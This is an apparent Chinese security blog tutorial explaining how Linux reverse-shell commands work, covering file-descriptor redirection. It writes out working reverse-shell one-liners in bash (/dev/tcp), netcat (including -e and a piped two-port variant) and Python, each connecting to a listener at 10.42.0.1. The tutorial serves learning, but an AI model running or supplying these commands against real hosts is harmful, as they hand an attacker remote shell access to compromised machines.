> 原文链接: https://www.anquanke.com//post/id/85712 


# 【技术分享】Linux渗透之反弹Shell命令解析


                                阅读量   
                                **360165**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



****

[![](https://p5.ssl.qhimg.com/t01017ce70b818b72c6.jpg)](https://p5.ssl.qhimg.com/t01017ce70b818b72c6.jpg)

作者：[派大星](http://bobao.360.cn/member/contribute?uid=1009682630)

稿费：200RMB（不服你也来投稿啊！）

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

当我们在渗透Linux主机时，反弹一个交互的shell是非常有必要的。在搜索引擎上搜索关键字“Linux 反弹shell”，会出现一大堆相关文章，但是其内容不但雷同，而且都仅仅是告诉我们执行这个命令就可以反弹shell了，却没有一篇文章介绍这些命令究竟是如何实现反弹shell的。既然大牛们懒得科普，那我就只好自己动手了。本文就来探讨一下相关命令实现的原理。

<br>

**Bash**

这篇文章的起因就是网上给的Bash反弹shell的实现：

```
bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
```

看到这短短的一行代码，正在复习Linux，自我感觉良好的我顿时充满了挫败感，这都是些什么鬼。于是决定一定要搞明白它。

首先，bash -i是打开一个交互的bash，这个最简单。我们先跳过“&gt;&amp;”和“0&gt;&amp;1”，这两个是本文重点，等会再说。先来说“/dev/tcp/”。

 /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。

要想了解“&gt;&amp;”和“0&gt;&amp;1”，首先我们要先了解一下Linux文件描述符和重定向。

linux shell下常用的文件描述符是：

1.  标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； 

2.  标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； 

3.  标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。

很多资料都会告诉我们，2&gt;&amp;1是将标准错误输出合并到标准输出中，但是这四个符号具体要如何理解呢？我刚开始直接将2&gt;看做标准错误输出，将&amp;看做and，将1看做标准输出。这样理解好像也挺对，但是如果是这样的话0&gt;&amp;1又该如何理解呢？

其实&amp;根本就不是and的意思，学过C/C++的都知道，在这两门语言里，&amp;是取地址符。在这里，我们也可以将它理解为取地址符。

好了，基本知识说完了，下面我们就探讨一下困扰了我一天的“&gt;&amp;”究竟是什么意思。首先，我在查资料的过程中虽然没有查到“&gt;&amp;”究竟是什么，但是有一个跟它长得很像的符号却被我发现了，那就是“&amp;&gt;”，它和“2&gt;&amp;1”是一个意思，都是将标准错误输出合并到标准输出中。难道“&gt;&amp;”和“&amp;&gt;”之间有什么不为人知的交易？让我们来动手测试一下。

[![](https://p5.ssl.qhimg.com/t01d09ef5a4c93903c5.png)](https://p5.ssl.qhimg.com/t01d09ef5a4c93903c5.png)

从图片中我们可以看到，在这里"&gt;&amp;"和“&amp;&gt;”作用是一样的，都是将标准错误输出定向到标准输出中。

既然如此，那么我们就把他俩互换试试看，究竟结果一不一样。

我在虚拟机里执行

```
bash -i &gt;&amp; /dev/tcp/10.0.42.1/1234
```

结果如下图所示，虽然命令和结果都在我本机上显示出来了，但实际上命令并不是在本机上输入的，而是只能在虚拟机里面输入，然后命令和结果都在我本机上显示。

[![](https://p0.ssl.qhimg.com/t0195bf356bb24445bc.png)](https://p0.ssl.qhimg.com/t0195bf356bb24445bc.png)

[![](https://p0.ssl.qhimg.com/t0197680e023bb7a93a.png)](https://p0.ssl.qhimg.com/t0197680e023bb7a93a.png)

我们再执行

```
bash -i &amp;&gt; /dev/tcp/10.42.0.1/1234
```

效果是一样的，就不上图了。所以由实践可知，“&gt;&amp;”和我们常见的“&amp;&gt;”是一个意思，都是将标准错误输出重定向到标注输出。

好了，一个问题已经解决，下一个就是“0&gt;&amp;1”。我们都知道，标准输入应该是“0&lt;”而不是“0&gt;”，难道这个跟上一个问题样都是同一个命令的不同写法？让我们试一下“0&lt;&amp;1”，看看会发生什么。

[![](https://p5.ssl.qhimg.com/t0123d89cb804d2a924.png)](https://p5.ssl.qhimg.com/t0123d89cb804d2a924.png)

[![](https://p1.ssl.qhimg.com/t01244d1b4b79c996ec.png)](https://p1.ssl.qhimg.com/t01244d1b4b79c996ec.png)

在上图中我们得到了一个交互的shell。果然是这样！“0&gt;&amp;1”和“0&lt;&amp;1”是一个意思，都是将标准输入重定向到标准输出中。使用

```
bash -i &amp;&gt; /dev/tcp/10.42.0.1 0&lt;&amp;1
```

同样能反弹一个可交互的shell。

综上所述，这句命令的意思就是，创建一个可交互的bash和一个到10.42.0.1:1234的TCP链接，然后将bash的输入输出错误都重定向到在10.42.0.1:1234监听的进程。

<br>

**NetCat**

如果目标主机支持“-e”选项的话，我们就可以直接用

```
nc -e /bin/bash 10.42.0.1 1234
```

但当不支持时，我们就要用到Linux神奇的管道了。我们可以在自己机器上监听两个端口，

```
nc -l -p 1234 -vv
nc -l -p 4321 -vv
```

然后在目标主机上执行以下命令：

```
nc  10.42.0.1 1234  |  /bin/bash  |  nc 10.42.0.1 4321
```

这时我们就可以在1234端口输入命令，在4321端口查看命令的输出了。

管道“|”可以将上一个命令的输出作为下一个命令的输入。所以上面命令的意思就是将10.42.0.1:1234传过来的命令交给/bin/bash执行，再将执行结果传给10.42.0.1:4321显示。

<br>

**Python**

```
python -c 
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.42.0.1",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);'
```

python -c表示执行后面的代码。首先引入了三个库socket,subprocess,os，这三个库后面都要用到，然后创建了一个使用TCP的socket，接着执行connect函数连接到黑客主机所监听的端口。接着执行os库的dup2函数来进行重定向。dup2传入两个文件描述符，fd1和fd2（fd1是必须存在的），如果fd2存在，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，fd2这个文件描述符不会发生变化，但是fd2指向的文件就变成了fd1指向的文件。 这个函数最大的作用是重定向。三个dup2函数先后将socket重定向到标准输入，标准输入，标准错误输出。最后建立了一个子进程,传入参数“-i”使bash以交互模式启动。这个时候我们的输入输出都会被重定向到socket，黑客就可以执行命令了。

[![](https://p2.ssl.qhimg.com/t0158e660feffec976e.png)](https://p2.ssl.qhimg.com/t0158e660feffec976e.png)

[![](https://p5.ssl.qhimg.com/t012e645a86f77299e7.png)](https://p5.ssl.qhimg.com/t012e645a86f77299e7.png)

我们可以看到成功的弹回了一个shell。<br>

<br>

**总结**

在对信息安全的学习中，我们要时刻保持好奇心，多问为什么，要多去探究根本原理，而不是只会使用工具和死记硬背，遇到不会又搜不到答案的问题，我们要大胆猜想，小心求证，只有这样我们才能不断的进步，在信息安全的领域越走越远。
